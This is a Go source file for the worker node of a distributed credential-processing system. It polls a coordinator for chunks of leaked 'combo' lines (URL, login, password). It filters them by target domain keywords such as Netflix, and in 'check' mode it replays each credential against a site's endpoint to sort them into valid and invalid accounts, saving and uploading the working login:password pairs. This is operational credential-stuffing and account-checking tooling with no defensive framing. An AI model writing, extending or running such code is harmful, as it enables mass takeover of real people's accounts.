package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

// ───────────────── Worker Node ─────────────────

type Worker struct {
	config         MeshConfig
	coordinatorURL string
	token          string
	nodeID         int
	email          string
	busy           atomic.Bool // drives the status field reported in heartbeats
}

func NewWorker(cfg MeshConfig, coordinatorAddr string) *Worker {
	return &Worker{
		config:         cfg,
		coordinatorURL: coordinatorAddr,
	}
}

func (w *Worker) Run() {
	// find our credentials from config
	if len(w.config.Nodes) == 0 {
		log.Fatal("[worker] no nodes configured in nodes.json")
	}
	// use first available node (or node_id from env)
	nodeIdx := 0
	if idStr := os.Getenv("NODE_ID"); idStr != "" {
		fmt.Sscanf(idStr, "%d", &nodeIdx)
		nodeIdx-- // 1-based to 0-based
	}
	if nodeIdx < 0 || nodeIdx >= len(w.config.Nodes) {
		nodeIdx = 0
	}
	node := w.config.Nodes[nodeIdx]
	w.nodeID = node.ID
	w.email = node.Email

	// register
	hostname, _ := os.Hostname()
	reg := RegisterReq{
		Email:    node.Email,
		Password: node.Password,
		NodeID:   node.ID,
		Hostname: hostname,
	}
	var regResp RegisterResp
	if err := w.post("/api/register", reg, &regResp); err != nil || !regResp.OK {
		log.Fatalf("[worker] register failed: %v — %s", err, regResp.Message)
	}
	w.token = regResp.Token
	log.Printf("[worker] registered as node %d (%s) — token %s", w.nodeID, w.email, w.token[:8])

	// start heartbeat
	go w.heartbeatLoop()

	// handle ctrl+c
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		log.Println("[worker] shutting down...")
		w.sendHeartbeat("offline", 0, 0)
		os.Exit(0)
	}()

	// main loop: poll for tasks
	for {
		task := w.pollTask()
		if task == nil || !task.OK {
			time.Sleep(5 * time.Second)
			continue
		}

		log.Printf("[worker] got task %s (mode=%s): %d lines, keywords: %s",
			task.TaskID[:8], task.Mode, task.Lines, strings.Join(task.Keywords, ", "))

		// process the task
		if task.Mode == "check" {
			w.processCheckTask(task)
		} else {
			w.processTask(task)
		}
	}
}

func (w *Worker) pollTask() *TaskResp {
	var resp TaskResp
	url := fmt.Sprintf("/api/task?token=%s", w.token)
	if err := w.get(url, &resp); err != nil {
		return nil
	}
	return &resp
}

// results written locally on this node (survives even if drive sync fails)
const resultsDir = "mesh_results"

func (w *Worker) processTask(task *TaskResp) {
	start := time.Now()
	w.busy.Store(true)
	defer w.busy.Store(false)

	if task.Data == "" {
		log.Printf("[worker] task %s has no chunk data — skipping", task.TaskID[:8])
		return
	}

	keywords := make([]string, len(task.Keywords))
	kwSan := make([]string, len(task.Keywords))
	hits := make([]int64, len(task.Keywords))
	payloads := make([][]string, len(task.Keywords))
	for i, kw := range task.Keywords {
		keywords[i] = strings.ToLower(kw)
		kwSan[i] = sanitizeName(keywords[i])
	}

	var lines, malformed, totalHits int64
	for _, line := range strings.Split(task.Data, "\n") {
		line = strings.TrimRight(line, "\r")
		if line == "" {
			continue
		}
		lines++
		url, login, pwd := splitCombo([]byte(line))
		if len(url) == 0 || len(login) == 0 || len(pwd) == 0 {
			malformed++
			continue
		}
		domain := extractDomain(url)
		if domain == "" || !strings.Contains(domain, ".") {
			malformed++
			continue
		}
		// valid combo: count hits per matching keyword (notnetflix.com style
		// domains simply match nothing — same semantics as combofilter.py)
		for i, kw := range keywords {
			if domainMatches(domain, kw) {
				payloads[i] = append(payloads[i], string(login)+":"+string(pwd))
				hits[i]++
				totalHits++
			}
		}
	}

	// write locally first — results exist even if the submit/drive fails
	os.MkdirAll(resultsDir, 0755)
	var results []KeywordResult
	for i, kw := range keywords {
		if hits[i] == 0 {
			continue
		}
		fpath := filepath.Join(resultsDir,
			fmt.Sprintf("%s_%s_node%d.txt", kwSan[i], task.TaskID[:8], w.nodeID))
		if f, err := os.OpenFile(fpath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
			for _, p := range payloads[i] {
				fmt.Fprintln(f, p)
			}
			f.Close()
		} else {
			log.Printf("[worker] local write failed %s: %v", fpath, err)
		}
		results = append(results, KeywordResult{
			Keyword:  kw,
			Lines:    hits[i],
			Hits:     hits[i],
			Payloads: payloads[i],
		})
	}

	// submit counts + payloads to coordinator for drive sync
	result := ResultSubmit{
		Token:     w.token,
		TaskID:    task.TaskID,
		Results:   results,
		Lines:     lines,
		Hits:      totalHits,
		Malformed: malformed,
		Duration:  time.Since(start).Seconds(),
	}
	var resp ResultResp
	if err := w.post("/api/result", result, &resp); err != nil {
		log.Printf("[worker] result submit failed: %v", err)
		return // coordinator never got them — local copy still holds them
	}

	log.Printf("[worker] task %s done: %d lines, %d hits, %d malformed in %.1fs",
		task.TaskID[:8], lines, totalHits, malformed, result.Duration)
}

// processCheckTask: replay each line against the profile endpoint (ported
// from checker/validator.py) and sort into valid/invalid/errors buckets.
func (w *Worker) processCheckTask(task *TaskResp) {
	start := time.Now()
	w.busy.Store(true)
	defer w.busy.Store(false)

	if task.Profile == nil || task.Profile.Endpoint == "" {
		log.Printf("[worker] task %s check-mode but no profile — skipping", task.TaskID[:8])
		return
	}

	buckets, validN, invalidN, errN := checkChunk(task.Data, task.Profile)

	// local result files per bucket — survive submit/drive failures
	os.MkdirAll(resultsDir, 0755)
	var results []KeywordResult
	bucketFiles := map[string]string{
		bucketValid:   fmt.Sprintf("%s_valid_%s_node%d.txt", strings.Join(task.Keywords, "+"), task.TaskID[:8], w.nodeID),
		bucketInvalid: fmt.Sprintf("%s_invalid_%s_node%d.txt", strings.Join(task.Keywords, "+"), task.TaskID[:8], w.nodeID),
		bucketErrors:  fmt.Sprintf("%s_errors_%s_node%d.txt", strings.Join(task.Keywords, "+"), task.TaskID[:8], w.nodeID),
	}
	// safe joined name
	for b := range bucketFiles {
		bucketFiles[b] = sanitizeName(bucketFiles[b])
	}
	for _, bucket := range []string{bucketValid, bucketInvalid, bucketErrors} {
		var rows []string
		for _, r := range buckets {
			if r.bucket == bucket {
				rows = append(rows, r.out)
			}
		}
		if len(rows) == 0 {
			continue
		}
		fpath := filepath.Join(resultsDir, bucketFiles[bucket])
		if f, err := os.OpenFile(fpath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
			for _, row := range rows {
				fmt.Fprintln(f, row)
			}
			f.Close()
		} else {
			log.Printf("[worker] local write failed %s: %v", fpath, err)
		}
		results = append(results, KeywordResult{
			Keyword:  bucket,
			Lines:    int64(len(rows)),
			Hits:     int64(len(rows)),
			Payloads: rows,
		})
	}

	result := ResultSubmit{
		Token:     w.token,
		TaskID:    task.TaskID,
		Results:   results,
		Lines:     int64(validN + invalidN + errN),
		Hits:      int64(validN),
		Malformed: 0,
		Duration:  time.Since(start).Seconds(),
	}
	var resp ResultResp
	if err := w.post("/api/result", result, &resp); err != nil {
		log.Printf("[worker] result submit failed: %v", err)
		return
	}

	log.Printf("[worker] check task %s done: valid %d | invalid %d | errors %d in %.1fs",
		task.TaskID[:8], validN, invalidN, errN, result.Duration)
}

func (w *Worker) heartbeatLoop() {
	ticker := time.NewTicker(time.Duration(w.config.HeartbeatInterval) * time.Second)
	for range ticker.C {
		status := "idle"
		if w.busy.Load() {
			status = "busy"
		}
		w.sendHeartbeat(status, 0, 0)
	}
}

func (w *Worker) sendHeartbeat(status string, lines, hits int64) {
	req := HeartbeatReq{
		Token:  w.token,
		Status: status,
		Lines:  lines,
		Hits:   hits,
	}
	var resp map[string]bool
	w.post("/api/heartbeat", req, &resp)
}

// ───────────────── HTTP helpers ─────────────────

func (w *Worker) post(path string, data interface{}, result interface{}) error {
	body, _ := json.Marshal(data)
	resp, err := http.Post(w.coordinatorURL+path, "application/json", bytes.NewReader(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return json.NewDecoder(resp.Body).Decode(result)
}

func (w *Worker) get(path string, result interface{}) error {
	resp, err := http.Get(w.coordinatorURL + path)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return json.NewDecoder(resp.Body).Decode(result)
}
